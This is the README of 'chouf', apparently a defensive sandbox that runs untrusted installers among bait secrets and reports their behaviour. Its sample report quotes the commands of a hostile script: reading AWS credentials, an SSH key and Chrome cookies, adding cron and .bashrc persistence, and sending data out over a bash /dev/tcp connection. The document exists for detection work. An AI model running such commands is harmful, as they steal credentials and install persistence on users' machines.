# chouf

*chouf* (« look » in Darija) runs a program in a throwaway sandbox full of **bait secrets** and tells you, in plain words,
what it really did: which secrets it went after, how it will start again by itself, what it now trusts.

```
$ chouf run --file install-theme.sh -- sh /input/install-theme.sh

Secrets it went after
 ! opened, read ~/.aws/credentials  (AWS access keys)
             by cat /root/.aws/credentials /root/.ssh/id_ed25519
 ! opened, read ~/.config/google-chrome/Default/Cookies  (Chrome cookies)
             by cp /root/.config/google-chrome/Default/Cookies /tmp/c
 ! opened, read ~/.ssh/id_ed25519  (SSH private key)
             by cat /root/.aws/credentials /root/.ssh/id_ed25519

Ways it will run again by itself
 ! added     /etc/cron.d/theme-update  (scheduled task)
             by sh /input/install-theme.sh
 ! opened, wrote ~/.bashrc  (runs in every new terminal)
             by sh /input/install-theme.sh

What it now trusts
 ! added     /etc/apt/sources.list.d/theme.list  (adds a software source)
             by sh /input/install-theme.sh

Everything else it changed
   added     /tmp/c
             by cp /root/.config/google-chrome/Default/Cookies /tmp/c

Where it connected
   example.com (2606:4700:10::6814:179a) port 80 tcp  by bash -c exec 3<>/dev/tcp/example.com/80; printf "POST /up HTTP/1.0\r\nContent-Length: 4\r…

Programs it ran (7)
   sh /input/install-theme.sh
     cat /root/.aws/credentials /root/.ssh/id_ed25519
     head -c 2000
     ls /root/.mozilla/firefox/
     cp /root/.config/google-chrome/Default/Cookies /tmp/c
     bash -c exec 3<>/dev/tcp/example.com/80; printf "POST /up HTTP/1.0\r\nContent-Length: 4\r…
       head -1
```

## How it works

- **A rootless podman container** (Ubuntu 24.04 by default). The program runs as root inside it, so installers behave as
  they would with `sudo`, but only the container's copy of the system is touched. `podman diff` gives every system file
  added, changed or deleted, minus what an empty container does by itself (measured once per image).
- **A fake home full of bait**: SSH and GPG keys, AWS, GitHub, npm, Docker and Kubernetes credentials, Chrome and Firefox
  cookies and passwords, a Bitcoin wallet, a `.env`, a shell history with an API key. None of it is real, and every value
  carries a token unique to the run, so a leaked secret can be traced back to the run that leaked it.
- **A kernel tracer, `chouf-trace`** (optional, root service, eBPF): from the first instruction of the program, which
  process ran what (with its arguments and parent), opened which file, connected where, and the domain name behind each
  address (read from the DNS answers). Each finding then says *which program* did it. The service only watches the
  sandbox's cgroup, and a user can only watch cgroups they own: nobody sees another user's processes.
- **inotify from the host**: the fake home is a bind mount, so every open, read, write, create and delete inside it is
  seen from outside, without root, including files written into folders created a microsecond earlier.

## Install the kernel tracer (optional)

```
sudo ./trace/install.sh      # builds as you, installs /usr/local/bin/chouf-trace and chouf-trace.service
```

Needs Linux 5.11+ with BTF (`/sys/kernel/btf/vmlinux`), clang and bpftool to build. Without it, chouf still reports
what was touched, without saying by whom or where it connected.

## Usage

```
chouf run [--image IMAGE] [--timeout SECS] [--no-net] [--file PATH]... -- COMMAND [ARGS]...
```

Exit code: 0 nothing alarming, 1 secrets / persistence / trust findings, 2 chouf itself failed.
Each run is kept in `~/.local/share/chouf/sessions/<id>/` (`report.json`, `stdout`, `stderr`, the fake home).

## Status

Early. Done: sandbox, baits, file watching, kernel tracer (who did what, where it connected).
Next: an agent that explores the program (sub-commands, interactive prompts, waiting for delayed behaviour) and
compares what it claims with what it does.

## Tests

```
cargo test                          # unit tests
cargo test --workspace -- --include-ignored     # + real runs through podman (and the tracer, when installed)
```

## License

GPL-2.0-only
